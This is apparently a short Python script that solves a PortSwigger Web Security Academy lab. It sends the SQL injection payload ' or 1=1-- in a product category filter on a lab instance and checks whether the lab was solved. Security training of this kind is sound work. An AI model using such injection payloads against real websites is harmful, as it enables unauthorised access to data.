#https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
from utils import *

url='https://0aad009204359f7482dae90600cc0080.web-security-academy.net/'
payload="filter?category=' or 1=1--"
exploit=f'{url}{payload}'

response=requests.get(exploit)
soup = BeautifulSoup(response.content, 'html.parser')
print(check_succes(soup))
